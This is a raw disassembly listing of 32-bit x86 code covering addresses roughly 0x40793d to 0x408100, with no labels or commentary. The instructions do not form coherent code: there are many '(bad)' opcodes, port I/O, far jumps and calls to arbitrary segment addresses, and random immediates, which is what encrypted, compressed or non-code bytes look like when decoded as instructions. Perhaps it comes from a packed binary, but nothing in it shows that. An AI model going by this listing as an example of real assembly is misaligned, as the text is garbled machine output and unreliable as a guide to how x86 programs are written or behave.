  40793d:	adc    bh,BYTE PTR [ebx+eiz*8+0x6c]
  407941:	jno    0x40790b
  407943:	(bad)  
  407944:	push   cs
  407945:	psubb  mm5,QWORD PTR [edi]
  407948:	jg     0x4078e9
  40794a:	pushf  
  40794b:	adc    esi,DWORD PTR [eax-0x3135173f]
  407951:	out    dx,eax
  407952:	xor    ah,BYTE PTR [ecx]
  407954:	stos   DWORD PTR es:[edi],eax
  407955:	ret    0x14a9
  407958:	mov    ecx,0xf1800582
  40795d:	and    al,0xec
  40795f:	dec    edi
  407960:	xchg   ebx,eax
  407961:	aas    
  407962:	(bad)  
  407964:	pop    edi
  407965:	sub    BYTE PTR [edx],bh
  407967:	jg     0x4078f3
  407969:	dec    ecx
  40796a:	(bad)  
  40796b:	jg     0x4079c2
  40796d:	test   eax,0xe8e9d6f3
  407972:	jge    0x4079a1
  407974:	dec    eax
  407975:	inc    ebp
  407976:	popf   
  407977:	xchg   esi,eax
  407978:	sub    ch,BYTE PTR ds:0x36991bd7
  40797e:	data16 sub al,0x26
  407981:	push   ss
  407982:	lahf   
  407983:	push   cs
  407984:	mov    dh,0x2
  407986:	test   al,0x0
  407988:	add    al,BYTE PTR [edx-0x596ef130]
  40798e:	int3   
  40798f:	xchg   edi,eax
  407990:	aad    0x3
  407992:	inc    edi
  407993:	loope  0x407a0f
  407995:	(bad)  
  407996:	mov    ebp,0x9c6174d5
  40799b:	xor    ch,ch
  40799d:	push   edx
  40799e:	mov    WORD PTR [ebx-0x5441dcbd],ds
  4079a4:	inc    ebp
  4079a5:	and    eax,DWORD PTR [edi+esi*2]
  4079a8:	jno    0x407935
  4079aa:	pushf  
  4079ab:	sub    al,0x13
  4079ad:	push   edx
  4079ae:	cmc    
  4079af:	jae    0x407966
  4079b1:	stos   BYTE PTR es:[edi],al
  4079b2:	nop
  4079b3:	sub    edx,DWORD PTR [eax*2-0x32cdd54e]
  4079ba:	ss cmc 
  4079bc:	mov    cl,BYTE PTR [ebx+0x3767bc56]
  4079c2:	adc    ah,BYTE PTR [edi+0x21fab2b4]
  4079c8:	(bad)  
  4079c9:	jne    0x4079a2
  4079cb:	ret    0x57bb
  4079ce:	fistp  DWORD PTR [edi]
  4079d0:	inc    esi
  4079d1:	iret   
  4079d2:	outs   dx,DWORD PTR ds:[esi]
  4079d3:	mov    bl,0x25
  4079d5:	cmp    BYTE PTR [ecx],dh
  4079d7:	stos   DWORD PTR es:[edi],eax
  4079d8:	and    eax,0xc7877646
  4079dd:	adc    BYTE PTR [edx-0x1ddcfeae],0xad
  4079e4:	sbb    eax,0x40199202
  4079e9:	js     0x4079cd
  4079eb:	hlt    
  4079ec:	in     al,dx
  4079ed:	push   ebx
  4079ee:	out    dx,eax
  4079ef:	pop    es
  4079f0:	outs   dx,BYTE PTR ds:[esi]
  4079f1:	pop    ebx
  4079f2:	jns    0x407a15
  4079f4:	add    DWORD PTR [ebx+0x63440a97],ecx
  4079fa:	mov    dh,0x3b
  4079fc:	cmp    al,0x93
  4079fe:	ret    
  4079ff:	sub    BYTE PTR [esi-0x6c585b07],ch
  407a05:	je     0x4079e4
  407a07:	pop    ebx
  407a08:	ins    BYTE PTR es:[edi],dx
  407a09:	jmp    0x407a29
  407a0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a0c:	inc    ecx
  407a0d:	(bad)  
  407a0e:	sbb    DWORD PTR [edi+0x49],edi
  407a11:	dec    esi
  407a12:	or     eax,0xe016f483
  407a17:	fs pop edi
  407a19:	mov    ds:0x78a3c918,eax
  407a1e:	das    
  407a1f:	sbb    eax,0x12fe52b0
  407a24:	stc    
  407a25:	int    0x8d
  407a27:	pop    ebx
  407a28:	or     ebp,ecx
  407a2a:	enter  0x9841,0xa7
  407a2e:	bound  eax,QWORD PTR [edi+0x15]
  407a31:	mov    edx,0xa87a7ec9
  407a36:	sbb    edx,DWORD PTR [ecx+0x1f68d6a]
  407a3c:	pop    ebp
  407a3d:	das    
  407a3e:	cwde   
  407a3f:	test   sp,si
  407a42:	pop    edx
  407a43:	pushf  
  407a44:	xor    eax,0x2cbfe006
  407a49:	push   eax
  407a4a:	cs inc esi
  407a4c:	or     al,0xb1
  407a4e:	jg     0x4079f8
  407a50:	mov    dh,0x7b
  407a52:	shl    BYTE PTR [eax],1
  407a54:	push   ecx
  407a55:	out    dx,eax
  407a56:	fidivr WORD PTR [edx+0x1a508a68]
  407a5c:	fwait
  407a5d:	jmp    0x407a83
  407a5f:	pushf  
  407a60:	adc    DWORD PTR [ebx+0x30d7234],esp
  407a66:	call   0xd180f99d
  407a6b:	mov    WORD PTR [edi],cs
  407a6d:	fcom   DWORD PTR [ecx-0x3e2b29be]
  407a73:	add    DWORD PTR [edi-0x16f403b8],ebx
  407a79:	(bad)  
  407a7a:	fabs   
  407a7c:	test   eax,0x6004f651
  407a81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a82:	pusha  
  407a83:	pushf  
  407a84:	mov    ebx,0x304b04ab
  407a89:	push   esi
  407a8a:	aam    0x9d
  407a8c:	into   
  407a8d:	inc    esi
  407a8e:	in     al,0xad
  407a90:	retf   0x989b
  407a93:	xor    esi,DWORD PTR [edi+0x1a4f4676]
  407a99:	outs   dx,DWORD PTR ds:[esi]
  407a9a:	fsubr  QWORD PTR [ebx+0x46f8856]
  407aa0:	xor    esp,0xffffff91
  407aa3:	(bad)  
  407aa5:	and    BYTE PTR [edx],al
  407aa7:	xor    esp,DWORD PTR [edi-0x2e]
  407aaa:	int3   
  407aab:	sub    dh,ah
  407aad:	mov    edi,0xa7cd35a2
  407ab2:	pop    ebx
  407ab3:	pop    eax
  407ab4:	inc    esi
  407ab5:	lock mov eax,0xae4d2e84
  407abb:	lods   eax,DWORD PTR ds:[esi]
  407abc:	jecxz  0x407ab3
  407abe:	jmp    0xfa1d:0xf6056be
  407ac5:	push   edi
  407ac6:	ja     0x407a62
  407ac8:	rcl    BYTE PTR [eax],cl
  407aca:	xchg   edi,eax
  407acb:	sbb    ecx,eax
  407acd:	fwait
  407ace:	jmp    0x9f2eb720
  407ad3:	ret    
  407ad4:	mov    ah,0xd4
  407ad6:	outs   dx,DWORD PTR ds:[esi]
  407ad7:	add    al,0xb4
  407ad9:	outs   dx,DWORD PTR ds:[esi]
  407ada:	mov    ebp,0xb294b815
  407adf:	or     eax,0x2bfc8dc8
  407ae4:	push   cs
  407ae5:	xor    al,0x9c
  407ae7:	call   0xe42dfa15
  407aec:	jecxz  0x407ae3
  407aee:	test   al,0x8e
  407af0:	mov    ?,WORD PTR [esi-0x6aaf4de9]
  407af6:	cmp    edx,0xc575c99f
  407afc:	popa   
  407afd:	adc    eax,0xcf6f0fdf
  407b02:	xor    cl,bl
  407b04:	ss test DWORD PTR es:[eax-0x654ef8d7],ebp
  407b0c:	scas   eax,DWORD PTR es:[edi]
  407b0d:	sbb    eax,DWORD PTR [esi-0x41f96784]
  407b13:	pop    ds
  407b14:	pushf  
  407b15:	push   ebp
  407b16:	das    
  407b17:	dec    esp
  407b18:	sbb    al,0xf8
  407b1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b1b:	ret    
  407b1c:	mov    eax,0x7d19dcee
  407b21:	daa    
  407b22:	xchg   ebx,eax
  407b23:	push   esi
  407b24:	mov    WORD PTR ss:[ebp+0x72],fs
  407b28:	and    al,0x4f
  407b2a:	xor    eax,0xd9cad790
  407b2f:	fiadd  DWORD PTR [ebx]
  407b31:	dec    eax
  407b32:	out    dx,eax
  407b33:	inc    ebx
  407b34:	aaa    
  407b35:	push   0xffffff89
  407b37:	imul   eax,DWORD PTR [edi-0x7f],0xffffffc6
  407b3b:	mov    al,0x75
  407b3d:	or     DWORD PTR [ebx+0x5e53f9a3],0xfffffffb
  407b44:	test   edx,esp
  407b46:	test   DWORD PTR [eax-0x397dce9c],0x96a0df6c
  407b50:	adc    BYTE PTR [edx-0x2f34e4b1],ah
  407b56:	sub    edi,DWORD PTR [edx+ecx*4-0x2a]
  407b5a:	retf   
  407b5b:	sub    esp,esp
  407b5d:	cld    
  407b5e:	jecxz  0x407b19
  407b60:	jg     0x407b1a
  407b62:	stos   DWORD PTR es:[edi],eax
  407b63:	dec    eax
  407b64:	repz gs imul ecx,edx,0xffffff95
  407b69:	jns    0x407aeb
  407b6b:	mov    ebx,0xb3d9de03
  407b70:	inc    edx
  407b71:	int    0x50
  407b73:	mov    ds:0x7def2e36,eax
  407b78:	xor    edi,edx
  407b7a:	stc    
  407b7b:	add    eax,0x5cbed443
  407b80:	out    0x6c,eax
  407b82:	jl     0x407b7e
  407b84:	mov    edx,0x62d02ced
  407b89:	push   0x5e
  407b8b:	mov    bh,0xe1
  407b8d:	mov    eax,ds:0xb25b7fd
  407b92:	sub    al,0xbe
  407b94:	test   eax,0xec6afc0d
  407b99:	inc    eax
  407b9a:	sbb    al,0xcd
  407b9c:	popa   
  407b9d:	add    ah,BYTE PTR [ecx]
  407b9f:	jmp    0x407bca
  407ba1:	popf   
  407ba2:	sub    BYTE PTR [eax+ecx*1+0x3a],al
  407ba6:	loopne 0x407b50
  407ba8:	xor    BYTE PTR [esi-0x3e85bdd0],dl
  407bae:	jae    0x407bb8
  407bb0:	cmp    al,0x2c
  407bb2:	sti    
  407bb3:	or     al,0x99
  407bb5:	call   0xed6adbd8
  407bba:	mov    ah,0xaa
  407bbc:	fucomip st,st(5)
  407bbe:	(bad)  
  407bc0:	and    BYTE PTR [edx+0x1e],0x9e
  407bc4:	ins    BYTE PTR es:[edi],dx
  407bc5:	les    ecx,FWORD PTR [esi+0x3839a439]
  407bcb:	dec    edi
  407bcc:	fsubr  DWORD PTR [edi-0x63]
  407bcf:	les    edx,FWORD PTR [edx]
  407bd1:	cmp    BYTE PTR [edx-0x4902cf4b],dl
  407bd7:	popf   
  407bd8:	push   0xffffff86
  407bda:	jmp    0x407be5
  407bdc:	scas   al,BYTE PTR es:[edi]
  407bdd:	lods   al,BYTE PTR ds:[esi]
  407bde:	dec    edx
  407bdf:	and    cl,BYTE PTR ds:0xe507accf
  407be5:	adc    al,0x4f
  407be7:	mov    ah,0xd8
  407be9:	inc    esi
  407bea:	(bad)  [eax]
  407bec:	add    DWORD PTR [ecx-0x4c],edi
  407bef:	out    0x3e,eax
  407bf1:	adc    ebp,eax
  407bf3:	cdq    
  407bf4:	mov    eax,ds:0xfd7cf52f
  407bf9:	xchg   edx,ebx
  407bfb:	dec    edi
  407bfc:	push   0x88eb9fd
  407c01:	mov    cl,0x68
  407c03:	lods   eax,DWORD PTR ds:[esi]
  407c04:	into   
  407c05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c06:	pop    ss
  407c07:	data16 sbb al,0x17
  407c0a:	dec    ebx
  407c0b:	jnp    0x407b95
  407c0d:	aam    0x60
  407c0f:	push   esp
  407c10:	outs   dx,BYTE PTR ds:[esi]
  407c11:	add    BYTE PTR [esi+edi*1-0x490296d6],dh
  407c18:	fmul   QWORD PTR [ecx+ebp*8-0x723057fb]
  407c1f:	ror    DWORD PTR [ebx+0x70],0x4d
  407c23:	and    al,0xac
  407c25:	rcl    DWORD PTR [edx-0x8],0xf3
  407c29:	call   0x66b0:0x975759d4
  407c30:	mov    cl,0xbd
  407c32:	loopne 0x407c50
  407c34:	add    ecx,edx
  407c36:	imul   edi,DWORD PTR [esi-0x297c76a9],0x688a7d12
  407c40:	add    BYTE PTR [edi],cl
  407c42:	cwde   
  407c43:	lahf   
  407c44:	jmp    0xe87b300d
  407c49:	idiv   DWORD PTR [edx-0x481175fd]
  407c4f:	lds    esi,FWORD PTR [ecx+eiz*8-0x6fcc2d2a]
  407c56:	stos   DWORD PTR es:[edi],eax
  407c57:	es mov bl,0xe1
  407c5a:	jns    0x407be1
  407c5c:	into   
  407c5d:	cli    
  407c5e:	jp     0x407cb7
  407c60:	or     al,0x49
  407c62:	fcomp  DWORD PTR [ebx-0x2]
  407c65:	pop    ss
  407c66:	adc    al,0x3a
  407c68:	or     DWORD PTR [esi],0xd167741f
  407c6e:	push   edx
  407c6f:	shr    ecx,cl
  407c71:	pop    eax
  407c72:	dec    ebp
  407c73:	dec    ebp
  407c74:	dec    edi
  407c75:	bound  eax,QWORD PTR [ecx-0x6276e179]
  407c7b:	xor    bx,WORD PTR [edi]
  407c7e:	ffreep st(0)
  407c80:	pusha  
  407c81:	and    bh,cl
  407c83:	add    BYTE PTR [ebp+0x2206071d],bh
  407c89:	jecxz  0x407c91
  407c8b:	mov    ch,0x83
  407c8d:	pop    ecx
  407c8e:	push   edx
  407c8f:	ficomp DWORD PTR [esi]
  407c91:	sbb    esp,DWORD PTR [ebx+ecx*4-0x4d727967]
  407c98:	add    ecx,esi
  407c9a:	adc    al,0x4b
  407c9c:	adc    al,0x27
  407c9e:	out    dx,eax
  407c9f:	test   DWORD PTR [esi+ecx*2+0x6d],esi
  407ca3:	neg    BYTE PTR [edx-0xeb635ba]
  407ca9:	mov    ebp,0xa71561e6
  407cae:	clc    
  407caf:	inc    esp
  407cb0:	mov    bh,0x35
  407cb2:	push   ebp
  407cb3:	push   ebx
  407cb4:	xor    ecx,DWORD PTR [esi+0x4584cda0]
  407cba:	xchg   edx,eax
  407cbb:	mov    eax,0x4aa646a6
  407cc0:	mov    bl,0x41
  407cc2:	test   al,0xdf
  407cc4:	jle    0x407d09
  407cc6:	sti    
  407cc7:	pop    edi
  407cc8:	sar    BYTE PTR [edi],0x7
  407ccb:	fwait
  407ccc:	cli    
  407ccd:	outs   dx,DWORD PTR ds:[esi]
  407cce:	inc    BYTE PTR [ebx+0x5]
  407cd1:	shl    DWORD PTR [ebx],1
  407cd3:	(bad)  
  407cd4:	jb     0x407c71
  407cd6:	jl     0x407c85
  407cd8:	adc    bl,ch
  407cda:	stos   BYTE PTR es:[edi],al
  407cdb:	inc    esp
  407cdc:	outs   dx,DWORD PTR ds:[esi]
  407cdd:	mov    bh,0x77
  407cdf:	dec    ecx
  407ce0:	sbb    DWORD PTR [ebp-0x3a],edi
  407ce3:	pop    ebx
  407ce4:	aam    0x3
  407ce6:	xchg   ebp,eax
  407ce7:	xor    BYTE PTR [edi-0x66],dl
  407cea:	clc    
  407ceb:	mov    ds:0xbf33176b,al
  407cf0:	aam    0x75
  407cf2:	gs mov cl,0x7a
  407cf5:	test   BYTE PTR [esi-0xf44e92b],ah
  407cfb:	fisttp QWORD PTR [edi+0x53505db2]
  407d01:	test   DWORD PTR [edi],esi
  407d03:	jmp    0x699d:0x32f63a46
  407d0a:	popf   
  407d0b:	sub    DWORD PTR [ecx+0x78],0x20
  407d0f:	lahf   
  407d10:	retf   
  407d11:	jg     0x407d8c
  407d13:	pop    ecx
  407d14:	xchg   esi,eax
  407d15:	mov    BYTE PTR [ecx+0x709a3732],dl
  407d1b:	lea    ecx,[esi+0x10]
  407d1e:	ss ret 0x9962
  407d22:	mov    dh,0xad
  407d24:	pop    ecx
  407d25:	sub    cl,BYTE PTR [ebx-0xd3da4ac]
  407d2b:	cwde   
  407d2c:	mov    ss,WORD PTR [esi-0xbddb40]
  407d32:	dec    esi
  407d33:	mov    eax,ds:0x8504b49e
  407d38:	push   es
  407d39:	cmp    BYTE PTR [ebx-0x753ff651],0x75
  407d40:	push   ebx
  407d41:	out    dx,eax
  407d42:	pop    ecx
  407d43:	pop    ds
  407d44:	xor    al,0x52
  407d46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d47:	je     0x407d5b
  407d49:	push   edi
  407d4a:	call   0xb972:0xe3cdaecd
  407d51:	cld    
  407d52:	dec    eax
  407d53:	daa    
  407d54:	add    bl,bl
  407d56:	ds jmp 0x41fe:0x48c3dcc0
  407d5e:	xchg   DWORD PTR [esi-0x40],eax
  407d61:	sbb    ch,al
  407d63:	cdq    
  407d64:	das    
  407d65:	or     al,0xc7
  407d67:	and    eax,0x730ed89d
  407d6c:	call   0x9e03b96a
  407d71:	push   esp
  407d72:	mov    dl,0xe2
  407d74:	pop    eax
  407d75:	loopne 0x407db0
  407d77:	xor    ebp,esp
  407d79:	cmp    eax,0x904fec1d
  407d7e:	and    eax,0x82d31980
  407d83:	mov    al,0xd7
  407d85:	inc    eax
  407d86:	fist   WORD PTR [ebx-0x3b]
  407d89:	ja     0x407d89
  407d8b:	cmp    ah,BYTE PTR [esi-0x58ddf987]
  407d91:	ret    0xa1f3
  407d94:	adc    al,0x1d
  407d96:	(bad)  
  407d97:	rcr    BYTE PTR [eax+0x11],1
  407d9a:	pop    edx
  407d9b:	and    BYTE PTR [ebp+0x33],ah
  407d9e:	cmc    
  407d9f:	and    BYTE PTR [edi+0x28],0xea
  407da3:	inc    ecx
  407da4:	inc    edi
  407da5:	xor    eax,0xa199797a
  407daa:	push   es
  407dab:	test   dl,0x52
  407dae:	sbb    cl,bh
  407db0:	stos   BYTE PTR es:[edi],al
  407db1:	pop    edx
  407db2:	sub    eax,DWORD PTR [ebx-0x70]
  407db5:	nop
  407db6:	out    0xbf,eax
  407db8:	(bad)  
  407db9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dba:	xchg   BYTE PTR [edx+edi*1],dl
  407dbd:	cdq    
  407dbe:	pop    ss
  407dbf:	add    ebx,ebx
  407dc1:	cs mov esp,0x7ec69fc5
  407dc7:	push   0x64a11c3
  407dcc:	jo     0x407d69
  407dce:	pop    ss
  407dcf:	daa    
  407dd0:	cmc    
  407dd1:	test   esi,edi
  407dd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dd4:	mov    esi,0xf74528b6
  407dd9:	push   eax
  407dda:	scas   al,BYTE PTR es:[edi]
  407ddb:	mov    esp,0x80925c99
  407de0:	ret    0x77f0
  407de3:	loopne 0x407e19
  407de5:	inc    ebx
  407de6:	or     BYTE PTR [ebx],0x29
  407de9:	repz adc al,0x1d
  407dec:	loope  0x407d94
  407dee:	in     al,dx
  407def:	aad    0x77
  407df1:	(bad)  
  407df2:	ficomp WORD PTR [esi+eax*8+0x38fbb99f]
  407df9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dfa:	mov    ebx,0x4a5f44b5
  407dff:	jo     0x407e15
  407e01:	xchg   DWORD PTR [eax-0x60046d7a],ebp
  407e07:	ret    
  407e08:	jg     0x407db7
  407e0a:	jmp    0x8444756
  407e0f:	in     eax,0x69
  407e11:	(bad)  
  407e12:	adc    dh,0x39
  407e15:	mov    DWORD PTR [edx],edi
  407e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e18:	sub    BYTE PTR [ebx],bl
  407e1a:	test   al,0xfe
  407e1c:	mov    cl,0xff
  407e1e:	sub    eax,0x7d85737
  407e23:	sti    
  407e24:	pop    ebx
  407e25:	int    0x27
  407e27:	test   DWORD PTR [edi+esi*1-0x30],esp
  407e2b:	dec    ecx
  407e2c:	pop    ss
  407e2d:	arpl   WORD PTR [eax+0x39f89336],dx
  407e33:	xor    al,al
  407e35:	les    eax,FWORD PTR [esi+0x58]
  407e38:	nop
  407e39:	sbb    esi,DWORD PTR [edx-0x34]
  407e3c:	pushf  
  407e3d:	mov    eax,ds:0x96ba8031
  407e42:	retf   
  407e43:	xchg   BYTE PTR [esi+0x29],dh
  407e46:	fnsave [edi+0x64456944]
  407e4c:	das    
  407e4d:	sahf   
  407e4e:	repnz mov BYTE PTR [ebx-0x8],dl
  407e52:	sbb    al,0x75
  407e54:	out    dx,al
  407e55:	mov    al,ds:0xacb8501e
  407e5a:	pop    ebx
  407e5b:	jne    0x407ea4
  407e5d:	inc    ecx
  407e5e:	push   0xfffffff6
  407e60:	sub    eax,0x4df2f46c
  407e65:	jo     0x407e67
  407e67:	retf   0xd3ff
  407e6a:	sub    BYTE PTR [eax+0x7b37e615],al
  407e70:	out    dx,eax
  407e71:	and    al,0x2
  407e73:	lea    esi,[ecx+0x6]
  407e76:	enter  0x272e,0x46
  407e7a:	jp     0x407eb2
  407e7c:	and    esi,eax
  407e7e:	out    dx,eax
  407e7f:	or     ebx,eax
  407e81:	sub    eax,0xdf0da805
  407e86:	pop    ecx
  407e87:	push   ecx
  407e88:	ds ja  0x407e29
  407e8b:	aam    0x73
  407e8d:	inc    edi
  407e8e:	xchg   ebx,eax
  407e8f:	push   eax
  407e90:	loop   0x407eca
  407e92:	out    dx,eax
  407e93:	push   cs
  407e94:	(bad)  
  407e96:	push   esi
  407e97:	and    al,0x14
  407e99:	in     al,dx
  407e9a:	xor    eax,0xcd2bd7b1
  407e9f:	sbb    bl,al
  407ea1:	hlt    
  407ea2:	sub    BYTE PTR [esi+0x685814c0],al
  407ea8:	dec    ebp
  407ea9:	xor    BYTE PTR [edx*1-0x230e29eb],bl
  407eb0:	fnstsw WORD PTR [edi]
  407eb2:	mov    esi,0x3a092956
  407eb7:	jb     0x407e4d
  407eb9:	loopne 0x407e82
  407ebb:	mov    edx,0x841b3e36
  407ec0:	xchg   cl,dl
  407ec2:	cmc    
  407ec3:	add    edx,DWORD PTR [ebx+0xd]
  407ec6:	inc    ebp
  407ec7:	gs cmp al,0xbb
  407eca:	lods   eax,DWORD PTR ds:[esi]
  407ecb:	imul   ebx,DWORD PTR [ecx-0x32f8266a],0x1
  407ed2:	adc    eax,0x14c9e2a3
  407ed7:	inc    esi
  407ed8:	sub    DWORD PTR [ecx],0x5d
  407edb:	or     al,0xdb
  407edd:	call   0x5a7c:0x9a4cd44
  407ee4:	mov    al,0xb8
  407ee6:	xor    ch,cl
  407ee8:	pushf  
  407ee9:	aam    0x91
  407eeb:	jp     0x407eb0
  407eed:	xchg   edi,eax
  407eee:	mov    esi,0x1f5c58b9
  407ef3:	lods   eax,DWORD PTR ds:[esi]
  407ef4:	fsub   DWORD PTR [ebp-0x42]
  407ef7:	clc    
  407ef8:	in     eax,0x9f
  407efa:	sbb    eax,0x5735296a
  407eff:	mov    bh,0x8c
  407f01:	lahf   
  407f02:	sbb    cl,al
  407f04:	mov    ebx,0x1db3a1b8
  407f09:	push   esp
  407f0a:	cmc    
  407f0b:	jns    0x407f49
  407f0d:	add    DWORD PTR [edx],edi
  407f0f:	adc    al,BYTE PTR [ebp+ebx*2+0x6b7fc3bc]
  407f16:	jmp    DWORD PTR [ebx+ebx*1+0x3a]
  407f1a:	neg    BYTE PTR [ebp-0x4b]
  407f1d:	and    al,0xe6
  407f1f:	outs   dx,DWORD PTR ds:[esi]
  407f20:	jmp    0x407ed2
  407f22:	sub    eax,0xb41368cf
  407f27:	jno    0x407f15
  407f29:	pop    esi
  407f2a:	shl    DWORD PTR [ebx-0x17],cl
  407f2d:	or     edx,DWORD PTR fs:[edi+0x11]
  407f31:	jae    0x407ede
  407f33:	add    esp,DWORD PTR [ebx+esi*4-0x53d176b0]
  407f3a:	ret    
  407f3b:	xlat   BYTE PTR ds:[ebx]
  407f3c:	add    eax,0x73c149ca
  407f41:	sbb    eax,0x87272f0f
  407f46:	add    edx,DWORD PTR ss:[ebp+eax*1-0xadae3eb]
  407f4e:	xchg   BYTE PTR [ebx+0x43],dl
  407f51:	addr16 enter 0xe4a4,0x37
  407f56:	test   eax,0x7e843b9a
  407f5b:	dec    edi
  407f5c:	jo     0x407fc5
  407f5e:	push   ss
  407f5f:	pop    es
  407f60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f61:	xor    cl,ah
  407f63:	fcomp  QWORD PTR [ecx-0x2f9d6b64]
  407f69:	mov    BYTE PTR [eax-0x79a56cf8],dl
  407f6f:	std    
  407f70:	outs   dx,DWORD PTR ds:[esi]
  407f71:	enter  0x3a93,0xe6
  407f75:	sub    DWORD PTR [ebp+0x7c],ebx
  407f78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f79:	mov    eax,0x17a58318
  407f7e:	into   
  407f7f:	pop    es
  407f80:	sbb    al,0x16
  407f82:	data16 jl 0x407fc8
  407f85:	adc    bh,cl
  407f87:	or     bh,BYTE PTR [edi]
  407f89:	xor    DWORD PTR [eax],ebp
  407f8b:	test   DWORD PTR [ecx+edi*4-0x2e],esi
  407f8f:	pushfw 
  407f91:	loope  0x407f61
  407f93:	ret    
  407f94:	cld    
  407f95:	lods   eax,DWORD PTR ds:[esi]
  407f96:	mov    WORD PTR [ecx-0x8a75708],ss
  407f9c:	push   ebp
  407f9d:	popf   
  407f9e:	sbb    edx,DWORD PTR [eax-0x59c9712b]
  407fa4:	inc    esi
  407fa5:	cmp    eax,0xe6dc85f4
  407faa:	sub    DWORD PTR [eax-0x5a],eax
  407fad:	and    BYTE PTR [edx+0x3e77d7b3],al
  407fb3:	bound  ebp,QWORD PTR [ecx-0x49b8e86e]
  407fb9:	pop    esp
  407fba:	ficomp DWORD PTR [ebp-0x5]
  407fbd:	push   0x37
  407fbf:	fsub   st(3),st
  407fc1:	add    eax,DWORD PTR [ecx]
  407fc3:	push   ecx
  407fc4:	fisubr WORD PTR [ecx]
  407fc6:	jg     0x407f9f
  407fc8:	xchg   ecx,eax
  407fc9:	and    BYTE PTR [esi+0x5b5e98ff],bh
  407fcf:	int3   
  407fd0:	xchg   BYTE PTR [eax+0x1b],ah
  407fd3:	cdq    
  407fd4:	arpl   sp,si
  407fd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fd7:	icebp  
  407fd8:	loope  0x407fe8
  407fda:	mov    ecx,0x7a005b7e
  407fdf:	arpl   WORD PTR [edx],dx
  407fe1:	dec    edx
  407fe2:	jmp    0x408004
  407fe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fe5:	mov    ds:0x5f00e747,eax
  407fea:	retf   0xafa9
  407fed:	jg     0x407fd4
  407fef:	jns    0x40805c
  407ff1:	mov    ch,0x2a
  407ff3:	push   ecx
  407ff4:	ja     0x407fd2
  407ff6:	push   eax
  407ff7:	dec    esi
  407ff8:	add    eax,0x601626b6
  407ffd:	and    cl,BYTE PTR [eax]
  407fff:	jmp    0x408036
  408001:	pop    esp
  408002:	retf   0xe22a
  408005:	sub    BYTE PTR [ebp+0x1485b725],cl
  40800b:	je     0x40805e
  40800d:	mov    dh,BYTE PTR [esi+0x67]
  408010:	push   eax
  408011:	add    eax,0x3a6a6a7e
  408016:	sbb    ah,BYTE PTR [bp+0x4d0d]
  40801b:	mov    dl,0x28
  40801d:	and    bh,BYTE PTR [edi+edi*8]
  408020:	lock setg BYTE PTR [eax]
  408024:	sti    
  408025:	ret    
  408026:	sbb    eax,0x7f2241b6
  40802b:	xchg   edi,eax
  40802c:	push   edx
  40802d:	ja     0x408088
  40802f:	jle    0x408086
  408031:	out    dx,al
  408032:	ror    BYTE PTR ds:0x4fa3a14d,cl
  408038:	mov    cl,0xa5
  40803a:	lds    ecx,FWORD PTR [ebp-0x77f7adcd]
  408040:	loope  0x408011
  408042:	cmp    DWORD PTR [esp+eax*1],0xffffff8f
  408046:	xor    al,0xe1
  408048:	inc    eax
  408049:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40804a:	mov    dl,0x13
  40804c:	fcomp  DWORD PTR [ebx-0x70d17965]
  408052:	adc    ecx,DWORD PTR [esi-0x2b]
  408055:	scas   al,BYTE PTR es:[edi]
  408056:	add    BYTE PTR [ebp+ebp*1-0x4],al
  40805a:	out    0x33,eax
  40805c:	lock inc esi
  40805e:	call   0xc20c7b8a
  408063:	xchg   edi,eax
  408064:	mov    ds:0x1575dca9,eax
  408069:	sbb    esp,DWORD PTR [eax+ebx*2+0x50]
  40806d:	fsubr  QWORD PTR [ebp+0x66]
  408070:	cmp    BYTE PTR [edx+0x1be1889e],ah
  408076:	out    0x1a,eax
  408078:	xor    BYTE PTR [eax],dl
  40807a:	(bad)  
  40807b:	mov    dl,0x2f
  40807d:	dec    edi
  40807e:	pop    esi
  40807f:	xchg   ebp,eax
  408080:	pop    ecx
  408081:	mov    gs,ecx
  408083:	sbb    DWORD PTR [ecx+0x75],ebx
  408086:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408087:	(bad)  
  408088:	addr16 fwait
  40808a:	icebp  
  40808b:	or     ecx,DWORD PTR [ebx+0x5743207a]
  408091:	xchg   BYTE PTR [esi+esi*4-0x246f56b4],ch
  408098:	ror    DWORD PTR [esi+0x11],cl
  40809b:	xchg   ecx,eax
  40809c:	add    al,BYTE PTR [ebp+0x50]
  40809f:	retf   
  4080a0:	ret    
  4080a1:	mov    bh,0x28
  4080a3:	jb     0x408054
  4080a5:	inc    ebx
  4080a6:	popa   
  4080a7:	mov    edi,0x897f3036
  4080ac:	loop   0x40804c
  4080ae:	inc    edi
  4080af:	ins    BYTE PTR es:[edi],dx
  4080b0:	xor    ch,BYTE PTR [ebp+ebp*1+0x2fb6bbb]
  4080b7:	or     DWORD PTR [edx+0x5890e802],ebx
  4080bd:	xchg   esp,eax
  4080be:	enter  0xc148,0x9c
  4080c2:	inc    esi
  4080c3:	pop    edx
  4080c4:	jbe    0x408077
  4080c6:	or     eax,0x3370dcdf
  4080cb:	sar    DWORD PTR ds:0x1eaf0723,0x8b
  4080d2:	lds    esp,FWORD PTR [ebp+0x7b3bcee5]
  4080d8:	xchg   esp,eax
  4080d9:	xor    BYTE PTR [edx+0x6c1149c1],dl
  4080df:	xor    edi,DWORD PTR [eax-0x46]
  4080e2:	clc    
  4080e3:	dec    esp
  4080e4:	pop    ecx
  4080e5:	push   ebp
  4080e6:	nop
  4080e7:	or     al,0x40
  4080e9:	mov    dh,0x84
  4080eb:	push   0x786f43b6
  4080f0:	sahf   
  4080f1:	call   0x88aa:0x42b8bb3
  4080f8:	ds rol esp,cl
  4080fb:	dec    edx
  4080fc:	cmc    
  4080fd:	jbe    0x408081
  4080ff:	in     al,dx
  408100:	and    bl,BYTE PTR [eax-0x67]
